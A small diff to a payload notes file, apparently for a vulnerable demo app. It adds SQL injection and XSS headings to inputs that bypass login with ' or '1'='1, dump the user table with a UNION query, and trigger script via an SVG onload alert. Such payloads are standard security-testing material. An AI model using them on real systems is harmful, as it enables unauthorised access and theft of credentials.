@@ -1,5 +1,6 @@
 Payloads:
 
+SQLi:
 Logging without knowing the password:
 	Username: sebastian.revuelta@kiuwan.com' or '1'='1
 	Password: whatever
@@ -12,5 +13,6 @@ Retrieving all users and passwords:
 	Password: ' UNION select * from user where '1'='1
 
 	Final query: select * from user where username = 'whatever' and password = '' UNION select * from user where '1'='1';
-	
-	
+
+XSS:	
+<svg onload=alert(1)>
